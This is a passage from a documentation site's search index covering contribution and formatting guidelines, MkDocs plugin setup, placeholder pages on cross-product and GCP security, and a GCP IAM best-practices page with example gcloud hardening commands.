</ol>"},{"location":"contributing/documentation-guidelines/#formatting-guidelines","title":"Formatting Guidelines","text":""},{"location":"contributing/documentation-guidelines/#headings","title":"Headings","text":"<p>Use descriptive headings to organize content:</p> <ul> <li>H1 (#): Page title (only one per page)</li> <li>H2 (##): Major sections</li> <li>H3 (###): Subsections</li> <li>H4 (####): Minor subsections</li> </ul>"},{"location":"contributing/documentation-guidelines/#lists","title":"Lists","text":"<p>Use bulleted lists for unordered items and numbered lists for sequential steps:</p> <pre><code>- Item 1\n- Item 2\n- Item 3\n\n1. First step\n2. Second step\n3. Third step\n</code></pre>"},{"location":"contributing/documentation-guidelines/#code-blocks","title":"Code Blocks","text":"<p>For code samples, command-line examples, or configuration files, use code blocks with appropriate language specification:</p> <pre><code>```bash\ngcloud organizations add-iam-policy-binding $ORG_ID \\\n    --member=user:email@example.com \\\n    --role=roles/resourcemanager.organizationAdmin\n```\n</code></pre>"},{"location":"contributing/documentation-guidelines/#tables","title":"Tables","text":"<p>Use tables to present structured data:</p> <pre><code>| Role | Description | Permissions |\n| ---- | ----------- | ----------- |\n| Admin | Full access | Read, Write, Delete |\n| Editor | Can modify | Read, Write |\n| Viewer | Read-only | Read |\n</code></pre>"},{"location":"contributing/documentation-guidelines/#using-admonitions","title":"Using Admonitions","text":"<p>Admonitions (callouts) help highlight important information in your documentation. Material for MkDocs provides a variety of admonition types that can be used to call attention to specific content. Use them strategically to draw attention to critical points.</p>"},{"location":"contributing/documentation-guidelines/#basic-admonition-types","title":"Basic Admonition Types","text":"<p>Note</p> <p>Use notes for additional information or context that may be helpful.</p> <p>Information</p> <p>Use for general information and helpful details that users should know.</p> <p>Tip</p> <p>Use tips for best practices or optimization advice.</p> <p>Success</p> <p>Use to highlight successful operations or positive outcomes.</p> <p>Warning</p> <p>Use warnings for potential issues that users should be aware of.</p> <p>Danger</p> <p>Use danger admonitions for critical security risks or destructive actions.</p> <p>Example</p> <p>Use examples to illustrate practical implementation.</p> <p>Question</p> <p>Use for FAQs or addressing common questions.</p> <p>Summary</p> <p>Use for summarizing complex information or key points.</p> <p>Bug</p> <p>Use to document known bugs or issues with a feature or system.</p> <p>Quote</p> <p>Use for highlighting quotations or important statements.</p> <p>Failure</p> <p>Use to indicate failed operations or negative outcomes.</p>"},{"location":"contributing/documentation-guidelines/#custom-admonitions","title":"Custom Admonitions","text":"<p>We've also set up custom admonitions specific to this documentation:</p> <p>Best Practice</p> <p>Use the custom best-practice admonition for Google-specific security recommendations.</p> <p>MSP Guidance</p> <p>Use the custom MSP admonition for managed service provider specific information.</p>"},{"location":"contributing/documentation-guidelines/#admonition-formatting-options","title":"Admonition Formatting Options","text":""},{"location":"contributing/documentation-guidelines/#custom-titles","title":"Custom Titles","text":"<p>You can customize the title or remove it entirely:</p> <p>Custom Title</p> <p>This admonition has a custom title instead of the default \"Note\" label.</p> <p>This admonition has no title at all (notice the empty quotes).</p>"},{"location":"contributing/documentation-guidelines/#collapsible-admonitions","title":"Collapsible Admonitions","text":"<p>Make admonitions collapsible to save space for detailed information:</p> Collapsible Note (closed by default) <p>This is a collapsible admonition that is closed by default. Click the arrow to expand.</p> <pre><code>def hello_world():\n    print(\"Hello, world!\")\n</code></pre> Collapsible Note (open by default) <p>This is a collapsible admonition that is open by default. Click the arrow to collapse.</p> <pre><code>def hello_world():\n    print(\"Hello, world!\")\n</code></pre>"},{"location":"contributing/documentation-guidelines/#nested-admonitions","title":"Nested Admonitions","text":"<p>You can nest admonitions for complex information hierarchies:</p> <p>Nested Admonitions</p> <p>This is an admonition that contains another admonition inside it.</p> <p>Warning</p> <p>This is a warning inside a note.</p> <p>Danger</p> <p>And this is a danger admonition inside the warning.</p>"},{"location":"contributing/documentation-guidelines/#admonitions-with-code-blocks","title":"Admonitions with Code Blocks","text":"<p>Include code samples within admonitions:</p> <p>Code Example</p> <pre><code>def calculate_total(items):\n    \"\"\"Calculate the total price of all items.\"\"\"\n    return sum(item.price for item in items)\n</code></pre>"},{"location":"contributing/documentation-guidelines/#admonitions-with-lists","title":"Admonitions with Lists","text":"<p>Include structured lists within admonitions:</p> <p>Security Checklist</p> <p>Here's a security checklist to follow:</p> <ol> <li>Enable MFA for all admin accounts</li> <li>Review access logs regularly</li> <li>Implement least privilege access</li> <li>Enable alerts for suspicious activities</li> <li>Back up critical data</li> </ol>"},{"location":"contributing/documentation-guidelines/#when-to-use-admonitions","title":"When to Use Admonitions","text":"<ul> <li>Security Risks: Use warning or danger admonitions to highlight security vulnerabilities or risks</li> <li>Implementation Notes: Use note admonitions for important implementation details</li> <li>Performance Tips: Use tip admonitions for performance optimizations</li> <li>Examples: Use example admonitions to demonstrate real-world scenarios</li> <li>Security Best Practices: Use best-practice admonitions for Google-specific security recommendations</li> <li>MSP-Specific: Use MSP admonitions for content specific to managed service providers</li> <li>Version Information: Use info admonitions for version-specific features</li> </ul>"},{"location":"contributing/documentation-guidelines/#creating-admonitions-in-markdown","title":"Creating Admonitions in Markdown","text":"<p>To create a standard admonition:</p> <pre><code>!!! type \"Optional custom title\"\n    Content of the admonition goes here.\n    \n    Multiple paragraphs can be included.\n</code></pre> <p>For collapsible admonitions (closed by default):</p> <pre><code>??? type \"Optional custom title\"\n    Content of the collapsible admonition.\n</code></pre> <p>For collapsible admonitions (open by default):</p> <pre><code>???+ type \"Optional custom title\"\n    Content of the collapsible admonition (open by default).\n</code></pre>"},{"location":"contributing/documentation-guidelines/#best-practices-for-using-admonitions","title":"Best Practices for Using Admonitions","text":"<ul> <li>Use admonitions sparingly to maintain their impact</li> <li>Choose the most appropriate admonition type for your content</li> <li>Keep admonition content concise and focused</li> <li>Ensure nested admonitions have a logical hierarchy</li> <li>Use consistent admonition types across the documentation for similar content</li> </ul>"},{"location":"contributing/documentation-guidelines/#images-and-diagrams","title":"Images and Diagrams","text":"<p>Use images and diagrams to illustrate complex concepts:</p> <ul> <li>Screenshots: Include screenshots for UI-based instructions</li> <li>Diagrams: Use Mermaid diagrams for architecture or process flows</li> <li>Alt Text: Always include descriptive alt text for accessibility</li> </ul>"},{"location":"contributing/documentation-guidelines/#mermaid-diagrams","title":"Mermaid Diagrams","text":"<p>Use Mermaid for creating diagrams directly in Markdown:</p> <pre><code>```mermaid\ngraph TD\n    A[Start] --&gt; B{Is it secure?}\n    B --&gt;|Yes| C[Deploy]\n    B --&gt;|No| D[Fix issues]\n    D --&gt; B\n```\n</code></pre>"},{"location":"contributing/documentation-guidelines/#version-information","title":"Version Information","text":"<p>When documenting features that are version-specific:</p> <p>Version Information</p> <p>This feature is available in Google Workspace Enterprise Plus and Education Plus editions.</p>"},{"location":"contributing/documentation-guidelines/#documentation-examples","title":"Documentation Examples","text":""},{"location":"contributing/documentation-guidelines/#security-control-implementation","title":"Security Control Implementation","text":"<p>Here's an example of documenting a security control:</p> <pre><code># Data Loss Prevention in Google Drive\n\n## Overview\n\nData Loss Prevention (DLP) helps prevent the unauthorized sharing of sensitive information in Google Drive.\n\n## Prerequisites\n\n- Google Workspace Enterprise Plus or Education Plus edition\n- Admin privileges in Google Workspace\n\n## Implementation Steps\n\n1. Access the Google Admin console\n2. Navigate to Security &gt; Data Protection\n3. Configure DLP rules\n\n!!! warning\n    DLP rules only apply to newly created content after the rule is implemented.\n\n## Example Configuration\n\n```yaml\nrules:\n  - name: \"Credit Card Information\"\n    pattern: \"[0-9]{16}\"\n    action: \"block_sharing\"\n</code></pre>"},{"location":"contributing/documentation-guidelines/#troubleshooting","title":"Troubleshooting","text":"<p>Tip</p> <p>If rules aren't being applied, check that the content was created after the rule was implemented.</p> <pre><code>## Page Metadata and Git Integration\n\nEach page includes comprehensive metadata and Git repository information at the bottom:\n\n### Git Repository Features\n\n- **Last Updated**: Shows when the page was last modified, with the exact date\n- **Page Authors**: Displays all contributors to the page based on Git history\n- **Star Repository**: Button to star the GitHub repository\n- **View Source**: Direct link to view the page source on GitHub\n- **Edit Page**: Quick link to edit the page on GitHub\n- **Report Issue**: Button to open a new issue for the page\n- **Feedback Buttons**: \"Was this page helpful?\" feedback section\n\nThese features help make the documentation more collaborative and maintainable.\n\n### Using Page Metadata in Front Matter\n\nYou can specify additional metadata in the page front matter:\n\n```yaml\n---\ntitle: Document Title\ndescription: A brief description of the document\nauthors:\n  - name: John Smith\n    email: john@example.com\n  - name: Jane Doe\n    email: jane@example.com\ndate: 2023-01-15\n---\n</code></pre> <p>The <code>authors</code> field will display those names in the page footer. If omitted, the Git commit history will be used to determine authors automatically.</p>"},{"location":"contributing/documentation-guidelines/#benefits-of-git-integration","title":"Benefits of Git Integration","text":"<ul> <li>Transparency: Users can see when content was last updated and by whom</li> <li>Contribution: Easy paths for users to contribute improvements</li> <li>Feedback: Multiple channels for users to provide feedback</li> <li>Accountability: Clear record of who authored and modified content</li> </ul>"},{"location":"contributing/documentation-guidelines/#setting-up-github-token-for-contributor-information","title":"Setting Up GitHub Token for Contributor Information","text":"<p>To display contributor information locally (avatars and names), you'll need to set up a GitHub personal access token:</p> <ol> <li>Create a GitHub personal access token at https://github.com/settings/tokens</li> <li>For public repositories, only the <code>public_repo</code> scope is needed</li> <li>Copy the <code>.env.example</code> file to <code>.env</code></li> <li>Add your token to the <code>.env</code> file:    <pre><code>MKDOCS_GIT_COMMITTERS_APIKEY=your_github_token_here\n</code></pre></li> <li>The <code>.env</code> file is ignored by Git and won't be committed</li> </ol> <p>Note</p> <p>Contributor information will still display when deployed even without a local token configured, as the CI/CD pipeline will have its own token for this purpose.</p>"},{"location":"contributing/documentation-guidelines/#additional-resources","title":"Additional Resources","text":"<p>For more comprehensive guidance on technical writing, refer to:</p> <ul> <li>Google Developer Documentation Style Guide</li> <li>Material for MkDocs Documentation</li> </ul>"},{"location":"contributing/plugin-installation/","title":"Material for MkDocs Plugin Installation","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"contributing/plugin-installation/#material-for-mkdocs-plugin-installation","title":"Material for MkDocs Plugin Installation","text":"<p>This guide explains how to install and configure additional plugins for the Google Security Suite documentation site. These plugins enhance the site with features like better search, image handling, and analytics.</p>"},{"location":"contributing/plugin-installation/#plugin-installation-process","title":"Plugin Installation Process","text":""},{"location":"contributing/plugin-installation/#step-1-basic-installation","title":"Step 1: Basic Installation","text":"<p>First, ensure you have the basic requirements installed:</p> <pre><code>pip install mkdocs mkdocs-material pymdown-extensions pillow\n</code></pre>"},{"location":"contributing/plugin-installation/#step-2-install-additional-plugins","title":"Step 2: Install Additional Plugins","text":"<p>Install each plugin individually to test compatibility:</p> <pre><code># Tag support\npip install mkdocs-material-extensions\n\n# Minification\npip install mkdocs-minify-plugin\n\n# Date information\npip install mkdocs-git-revision-date-localized-plugin\n\n# Image lightbox\npip install mkdocs-glightbox\n\n# Social cards\npip install mkdocs-material[imaging]\n</code></pre>"},{"location":"contributing/plugin-installation/#step-3-enable-plugins-in-mkdocsyml","title":"Step 3: Enable Plugins in mkdocs.yml","text":"<p>After installing the plugins, enable them one by one in your <code>mkdocs.yml</code> file:</p> <pre><code># Plugins\nplugins:\n  - search\n  - tags\n  # Add these one by one, testing after each addition\n  - minify:\n      minify_html: true\n  - git-revision-date-localized:\n      enable_creation_date: true\n      type: date\n  - glightbox:\n      touchNavigation: true\n      loop: false\n      effect: zoom\n      width: 100%\n      height: auto\n      zoomable: true\n      draggable: true\n  - social\n</code></pre>"},{"location":"contributing/plugin-installation/#plugin-descriptions","title":"Plugin Descriptions","text":""},{"location":"contributing/plugin-installation/#search-plugin","title":"Search Plugin","text":"<p>The default search plugin with enhanced features:</p> <pre><code>plugins:\n  - search:\n      separator: '[\\s\\-,:!=\\[\\]()\"/]+|(?!\\b)(?=[A-Z][a-z])|\\.(?!\\d)|&amp;[lg]t;'\n      lang:\n        - en\n</code></pre>"},{"location":"contributing/plugin-installation/#tags-plugin","title":"Tags Plugin","text":"<p>Adds support for content categorization:</p> <pre><code>plugins:\n  - tags:\n      tags_file: tags.md\n</code></pre>"},{"location":"contributing/plugin-installation/#minify-plugin","title":"Minify Plugin","text":"<p>Reduces the size of HTML, CSS, and JavaScript files:</p> <pre><code>plugins:\n  - minify:\n      minify_html: true\n      minify_js: true\n      minify_css: true\n      htmlmin_opts:\n        remove_comments: true\n</code></pre>"},{"location":"contributing/plugin-installation/#git-revision-date-plugin","title":"Git Revision Date Plugin","text":"<p>Displays when pages were last updated:</p> <pre><code>plugins:\n  - git-revision-date-localized:\n      enable_creation_date: true\n      type: date\n      fallback_to_build_date: true\n</code></pre>"},{"location":"contributing/plugin-installation/#glightbox-plugin","title":"GLightbox Plugin","text":"<p>Adds a lightbox for images:</p> <pre><code>plugins:\n  - glightbox:\n      touchNavigation: true\n      loop: false\n      effect: zoom\n      width: 100%\n      height: auto\n      zoomable: true\n      draggable: true\n</code></pre>"},{"location":"contributing/plugin-installation/#social-plugin","title":"Social Plugin","text":"<p>Generates social card images for sharing:</p> <pre><code>plugins:\n  - social:\n      cards_color:\n        fill: \"#0F9D58\"\n        text: \"#FFFFFF\"\n</code></pre>"},{"location":"contributing/plugin-installation/#additional-configuration","title":"Additional Configuration","text":""},{"location":"contributing/plugin-installation/#analytics-integration","title":"Analytics Integration","text":"<p>Configure Google Analytics:</p> <pre><code>extra:\n  analytics:\n    provider: google\n    property: G-XXXXXXXXXX\n</code></pre>"},{"location":"contributing/plugin-installation/#cookie-consent","title":"Cookie Consent","text":"<p>Add cookie consent controls:</p> <pre><code>extra:\n  consent:\n    title: Cookie consent\n    description: &gt;- \n      We use cookies to recognize your repeated visits and preferences, as well\n      as to measure the effectiveness of our documentation and whether users\n      find what they're searching for.\n    actions:\n      - accept\n      - reject\n      - manage\n</code></pre>"},{"location":"contributing/plugin-installation/#troubleshooting","title":"Troubleshooting","text":"<p>If you encounter issues with any plugins:</p> <ol> <li>Install plugins one at a time</li> <li>Verify each plugin works before adding the next</li> <li>Check plugin documentation for configuration requirements</li> <li>Review logs for specific error messages</li> <li>Ensure all dependencies are installed</li> </ol> <p>For specific plugin issues, refer to the plugin's documentation or GitHub repository.</p>"},{"location":"cross-product/","title":"Cross-Product Security Controls","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"cross-product/#overview","title":"\ud83d\udee1\ufe0f Overview","text":"<p>This section focuses on security controls, strategies, and architectures that span multiple Google products and services. It provides guidance on implementing cohesive security across Google Workspace, Google Cloud Platform, Chrome, and other Google services.</p> \ud83d\udd12 Unified Identity <p>Implementing consistent identity and access management across Google services</p> \ud83d\udee1\ufe0f Coordinated Defense <p>Building security strategies that leverage capabilities across product lines</p> \ud83d\udd0d Comprehensive Visibility <p>Gaining unified security visibility across all Google environments</p>"},{"location":"cross-product/#about-cross-product-security","title":"\ud83d\udd0d About Cross-Product Security","text":"<p>Organizations that use multiple Google products need security strategies that work across these environments. Cross-product security focuses on:</p>"},{"location":"cross-product/#key-security-considerations","title":"Key Security Considerations","text":"<ul> <li>Identity Federation: Managing identities consistently across services</li> <li>Security Center Integration: Connecting security monitoring across environments</li> <li>Threat Intelligence Sharing: Leveraging threat data across products</li> <li>Unified Security Policies: Implementing consistent controls</li> <li>Compliance Management: Meeting regulatory requirements across all Google services</li> <li>Security Operations: Building SOC capabilities for multi-product environments</li> <li>Zero Trust Architecture: Implementing zero trust across Google products</li> <li>Data Governance: Managing data protection across environments</li> </ul>"},{"location":"cross-product/#getting-started","title":"Getting Started","text":"<p>This section is organized into several key cross-product security areas:</p> <ol> <li>Identity Federation: Managing identities across Google products</li> <li>Zero Trust Architecture: Implementing consistent zero trust principles</li> <li>Security Operations: Building SOC capabilities for multiple Google services</li> <li>Data Protection: Consistent data security controls</li> <li>Threat Detection: Cross-environment threat monitoring</li> <li>Compliance Management: Unified compliance approach</li> <li>Security Architecture: Reference architectures for multi-product environments</li> <li>Security Automation: Automating security across Google products</li> </ol> <p>Use the navigation menu to explore specific topics. Each section provides detailed guidance, implementation steps, and security best practices for cross-product security.</p> <p>This guide is continually updated as Google security capabilities evolve.</p>"},{"location":"cross-product/compliance/","title":"Compliance Management","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on compliance management across Google products.</p>"},{"location":"cross-product/compliance/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on compliance management across Google products including:</p> <ul> <li>Cross-product compliance frameworks</li> <li>Unified compliance reporting</li> <li>Control mapping across products</li> <li>Compliance monitoring and validation</li> <li>Evidence collection and audit preparation</li> </ul>"},{"location":"cross-product/compliance/#coming-soon","title":"Coming Soon","text":"<ul> <li>Mapping regulatory requirements to Google controls</li> <li>Unified compliance reporting framework</li> <li>Automated compliance monitoring</li> <li>Cross-product audit log management</li> <li>Evidence collection and retention</li> <li>Preparing for compliance audits</li> </ul>"},{"location":"cross-product/identity-federation/","title":"Identity Federation","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on identity federation across Google products.</p>"},{"location":"cross-product/identity-federation/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on implementing identity federation across Google products including:</p> <ul> <li>Unified identity model</li> <li>Google Cloud Identity</li> <li>Workspace identity integration with GCP</li> <li>External identity provider federation</li> <li>Centralized access management</li> </ul>"},{"location":"cross-product/identity-federation/#coming-soon","title":"Coming Soon","text":"<ul> <li>Setting up Cloud Identity</li> <li>Federating on-premises identity systems</li> <li>Single sign-on across Google products</li> <li>Group-based access management</li> <li>Identity lifecycle management</li> <li>Audit and compliance for identity systems</li> </ul>"},{"location":"cross-product/security-operations/","title":"Security Operations","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on security operations across Google products.</p>"},{"location":"cross-product/security-operations/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on implementing security operations across Google products including:</p> <ul> <li>Unified security operations model</li> <li>Log aggregation and analysis</li> <li>Cross-product threat detection</li> <li>Alert correlation and triage</li> <li>Incident response procedures</li> <li>Security automation</li> </ul>"},{"location":"cross-product/security-operations/#coming-soon","title":"Coming Soon","text":"<ul> <li>Building a Google-focused security operations center</li> <li>Centralizing logs from all Google products</li> <li>Implementing effective detection rules</li> <li>Alert correlation strategies</li> <li>Incident response playbooks</li> <li>Security orchestration and automation</li> </ul>"},{"location":"cross-product/threat-intelligence/","title":"Threat Intelligence","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on threat intelligence across Google products.</p>"},{"location":"cross-product/threat-intelligence/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on leveraging threat intelligence across Google products including:</p> <ul> <li>Google's threat intelligence sources</li> <li>Integrating threat feeds</li> <li>Applying threat intelligence to detections</li> <li>Threat hunting with Google tools</li> <li>Intelligence-driven security posture</li> </ul>"},{"location":"cross-product/threat-intelligence/#coming-soon","title":"Coming Soon","text":"<ul> <li>Leveraging Google's built-in threat intelligence</li> <li>Integrating third-party threat feeds</li> <li>Implementing IOC matching</li> <li>Threat hunting techniques</li> <li>Threat intelligence sharing</li> <li>Applying intelligence to security controls</li> </ul>"},{"location":"cross-product/zero-trust/","title":"Zero Trust Architecture","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on Zero Trust architecture across Google products.</p>"},{"location":"cross-product/zero-trust/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on implementing Zero Trust security across Google products including:</p> <ul> <li>Zero Trust principles and architecture</li> <li>BeyondCorp Enterprise</li> <li>Identity-aware access controls</li> <li>Device trust and verification</li> <li>Continuous validation</li> <li>Progressive security implementation</li> </ul>"},{"location":"cross-product/zero-trust/#coming-soon","title":"Coming Soon","text":"<ul> <li>Zero Trust reference architecture for Google environments</li> <li>Implementing BeyondCorp across Workspace and GCP</li> <li>Context-aware access policies</li> <li>Device trust mechanisms</li> <li>Security monitoring for Zero Trust</li> <li>Migration strategies from perimeter-based security</li> </ul>"},{"location":"gcp/","title":"Google Cloud Platform Security","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"gcp/#overview","title":"\ud83d\udee1\ufe0f Overview","text":"<p>This section provides security professionals, cloud architects, and infrastructure teams with detailed strategies for securing Google Cloud Platform environments. It focuses on secure cloud architecture, identity protection, network security, data protection, and operational security.</p> \ud83d\udd12 Secure Architecture <p>Cloud security architecture patterns and best practices for GCP deployments</p> \ud83d\udee1\ufe0f Defense-in-Depth <p>Layered security controls to protect cloud infrastructure and workloads</p> \ud83d\udd0d Threat Detection <p>Advanced techniques for monitoring and detecting security threats in GCP</p>"},{"location":"gcp/#about-gcp-security","title":"\ud83d\udd0d About GCP Security","text":"<p>Google Cloud Platform security requires a comprehensive approach that addresses infrastructure security, application security, data protection, identity management, and compliance.</p>"},{"location":"gcp/#key-security-considerations","title":"Key Security Considerations","text":"<ul> <li>Shared Responsibility Model: Understanding what Google secures and what you are responsible for</li> <li>Identity &amp; Access Management: Implementing least privilege and secure IAM practices</li> <li>Network Security: Designing secure VPC architectures and implementing proper network controls</li> <li>Data Protection: Encrypting data at rest and in transit, managing secrets securely</li> <li>Compute Security: Hardening VMs, containers, and serverless functions</li> <li>Monitoring &amp; Detection: Implementing robust logging, monitoring, and alerting</li> <li>Incident Response: Planning for and practicing response to cloud security incidents</li> <li>Compliance: Meeting regulatory requirements in cloud environments</li> </ul>"},{"location":"gcp/#getting-started","title":"Getting Started","text":"<p>This section is organized into several key areas of GCP security:</p> <ol> <li>Identity &amp; Access Management: Managing identities, roles, permissions, and authentication</li> <li>Network Security: Securing VPC networks, firewalls, and connectivity</li> <li>Compute Security: Securing VMs, containers, Kubernetes, and serverless</li> <li>Storage &amp; Database Security: Protecting data in various storage services</li> <li>Logging &amp; Monitoring: Implementing effective security monitoring</li> <li>Security Command Center: Utilizing GCP's security management platform</li> <li>DevSecOps: Integrating security into CI/CD pipelines</li> <li>Compliance &amp; Governance: Maintaining regulatory compliance in GCP</li> </ol> <p>Use the navigation menu to explore specific topics. Each section provides detailed guidance, implementation steps, and security best practices for Google Cloud Platform environments.</p> <p>This guide is continually updated as Google Cloud Platform security capabilities evolve.</p>"},{"location":"gcp/compliance/","title":"Compliance &amp; Regulatory Controls in GCP","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on compliance and regulatory controls in Google Cloud Platform.</p>"},{"location":"gcp/compliance/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on meeting compliance requirements in Google Cloud Platform including:</p> <ul> <li>Frameworks and standards (e.g., NIST, ISO, SOC, PCI-DSS, HIPAA)</li> <li>Compliance controls in GCP</li> <li>Shared responsibility model</li> <li>Compliance automation</li> <li>Audit and evidence collection</li> </ul>"},{"location":"gcp/compliance/#coming-soon","title":"Coming Soon","text":"<ul> <li>Compliance mapping to GCP controls</li> <li>Configuring Assured Workloads</li> <li>Automating compliance monitoring</li> <li>Building compliant architectures</li> <li>Continuous compliance validation</li> <li>Regional compliance considerations</li> </ul>"},{"location":"gcp/compute-security/","title":"Compute Security in Google Cloud Platform","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on securing compute resources in Google Cloud Platform.</p>"},{"location":"gcp/compute-security/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on securing various compute resources in Google Cloud Platform including:</p> <ul> <li>Virtual Machines (Compute Engine)</li> <li>Containers (Cloud Run, GKE)</li> <li>Serverless (Cloud Functions)</li> <li>App Engine applications</li> </ul>"},{"location":"gcp/compute-security/#coming-soon","title":"Coming Soon","text":"<ul> <li>Hardening GCE instances</li> <li>Securing container workloads</li> <li>Securing serverless functions</li> <li>Identity-based access controls for compute resources</li> <li>Compute resource monitoring and logging best practices</li> <li>Vulnerability management for compute environments</li> </ul>"},{"location":"gcp/container-security/","title":"Kubernetes &amp; Container Security in GCP","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on securing Kubernetes and containers in Google Cloud Platform.</p>"},{"location":"gcp/container-security/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on securing container-based workloads in Google Cloud Platform including:</p> <ul> <li>Google Kubernetes Engine (GKE)</li> <li>Cloud Run</li> <li>Artifact Registry</li> <li>Container Analysis</li> <li>Binary Authorization</li> </ul>"},{"location":"gcp/container-security/#coming-soon","title":"Coming Soon","text":"<ul> <li>Securing GKE clusters</li> <li>Container image security scanning</li> <li>Supply chain security for containers</li> <li>Runtime security monitoring</li> <li>Network policies for Kubernetes</li> <li>Service mesh security controls</li> <li>Workload identity and access management</li> </ul>"},{"location":"gcp/iam/","title":"Identity & Access Management","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"gcp/iam/#identity-and-access-management-in-gcp","title":"Identity and Access Management in GCP","text":"<p>Identity and Access Management (IAM) is the foundation of security in Google Cloud Platform. This guide covers best practices, implementation strategies, and security considerations for IAM in GCP environments.</p>"},{"location":"gcp/iam/#core-iam-concepts","title":"Core IAM Concepts","text":""},{"location":"gcp/iam/#iam-policy-architecture","title":"IAM Policy Architecture","text":"<p>IAM in Google Cloud follows a hierarchical model where policies can be applied at various levels:</p> <ul> <li>Organization: The top-level entity that represents your company</li> <li>Folder: Optional containers for organizing projects</li> <li>Project: The main unit for grouping resources</li> <li>Resource: Individual cloud resources (e.g., VMs, buckets)</li> </ul> <p>Policies are inherited down the hierarchy, allowing for centralized control with the ability to delegate specific permissions as needed.</p>"},{"location":"gcp/iam/#iam-components","title":"IAM Components","text":"<ul> <li>Principal: The identity that is authenticating (user, service account, group, domain)</li> <li>Role: Collection of permissions that defines what actions are allowed</li> <li>Permission: Specific action that can be performed on a resource</li> <li>Policy: Binding of principals to roles on a resource</li> </ul>"},{"location":"gcp/iam/#security-best-practices","title":"Security Best Practices","text":""},{"location":"gcp/iam/#implement-least-privilege","title":"Implement Least Privilege","text":"<ul> <li>Assign the most restrictive roles necessary for users to perform their job functions</li> <li>Use predefined roles when possible, but create custom roles when needed for precise permissions</li> <li>Regularly review and audit permissions to identify and remove unnecessary access</li> </ul>"},{"location":"gcp/iam/#secure-service-accounts","title":"Secure Service Accounts","text":"<p>Service accounts are special accounts used by applications and compute workloads to authenticate to Google Cloud services.</p> <ul> <li>Create service accounts with minimal required permissions</li> <li>Rotate service account keys regularly (preferably use attached service accounts over downloaded keys)</li> <li>Implement constraints on service account creation and key downloading</li> <li>Audit service account usage regularly</li> </ul>"},{"location":"gcp/iam/#use-workforce-identity-federation","title":"Use Workforce Identity Federation","text":"<p>For enterprise environments, connect your existing identity provider to GCP:</p> <ul> <li>Configure federation with Azure AD, Okta, or other OIDC/SAML providers</li> <li>Implement group-based access management</li> <li>Enforce consistent authentication policies across cloud environments</li> </ul>"},{"location":"gcp/iam/#implement-conditional-access","title":"Implement Conditional Access","text":"<p>Enhance security with context-aware access controls:</p> <ul> <li>Restrict access based on IP address, device security status, and other attributes</li> <li>Configure access levels in VPC Service Controls</li> <li>Implement time-based access restrictions for sensitive operations</li> </ul>"},{"location":"gcp/iam/#monitoring-and-auditing","title":"Monitoring and Auditing","text":""},{"location":"gcp/iam/#enable-comprehensive-logging","title":"Enable Comprehensive Logging","text":"<ul> <li>Ensure Cloud Audit Logs are enabled for all projects</li> <li>Configure Data Access logs for sensitive resources</li> <li>Export logs to a centralized logging solution for long-term retention</li> </ul>"},{"location":"gcp/iam/#regular-access-reviews","title":"Regular Access Reviews","text":"<ul> <li>Implement quarterly access reviews for all IAM permissions</li> <li>Automate the identification of unused permissions and stale accounts</li> <li>Document the review process and findings for compliance purposes</li> </ul>"},{"location":"gcp/iam/#detect-anomalous-access","title":"Detect Anomalous Access","text":"<ul> <li>Configure alerts for suspicious IAM activity</li> <li>Monitor for privilege escalation events</li> <li>Implement automated responses to potential security incidents</li> </ul>"},{"location":"gcp/iam/#implementation-guide","title":"Implementation Guide","text":""},{"location":"gcp/iam/#designing-iam-architecture","title":"Designing IAM Architecture","text":"<ol> <li>Map your organizational structure to GCP</li> <li>Design folder hierarchy to reflect business units or environments</li> <li> <p>Implement consistent naming conventions</p> </li> <li> <p>Create a role strategy</p> </li> <li>Document which predefined roles to use for common job functions</li> <li> <p>Define process for custom role creation and approval</p> </li> <li> <p>Implement access patterns</p> </li> <li>Direct user access for administrators</li> <li>CI/CD pipeline access for deployments</li> <li>Application-level access for workloads</li> </ol>"},{"location":"gcp/iam/#security-hardening-steps","title":"Security Hardening Steps","text":"<pre><code># Example: Enforce organization policy constraints for service accounts\ngcloud resource-manager org-policies enable-enforce \\\n    --organization=ORGANIZATION_ID \\\n    constraints/iam.disableServiceAccountKeyCreation\n\n# Example: Set up custom role with least privilege\ngcloud iam roles create customRoleName \\\n    --organization=ORGANIZATION_ID \\\n    --title=\"Custom Role Title\" \\\n    --description=\"Description of the role\" \\\n    --permissions=compute.instances.get,compute.instances.list\n</code></pre>"},{"location":"gcp/iam/#common-risks-and-mitigations","title":"Common Risks and Mitigations","text":"Risk Mitigation Excessive permissions Implement least privilege and regular access reviews Leaked service account keys Use attached service accounts and key rotation Privilege escalation Monitor for permission changes and implement separation of duties Unauthorized access Implement MFA and conditional access policies Orphaned accounts Regular auditing of inactive accounts and automatic deprovisioning"},{"location":"gcp/iam/#advanced-topics","title":"Advanced Topics","text":""},{"location":"gcp/iam/#privileged-access-management","title":"Privileged Access Management","text":"<ul> <li>Implement just-in-time privileged access</li> <li>Require approval workflows for sensitive operations</li> <li>Log and audit all privileged access</li> </ul>"},{"location":"gcp/iam/#iam-for-multi-tenant-environments","title":"IAM for Multi-tenant Environments","text":"<ul> <li>Design isolation between customer environments</li> <li>Implement separate projects or folders per customer</li> <li>Use VPC Service Controls to enforce boundaries</li> </ul>"},{"location":"gcp/iam/#automating-iam-management","title":"Automating IAM Management","text":"<ul> <li>Use Terraform or other IaC tools to manage IAM configurations</li> <li>Implement automated testing of 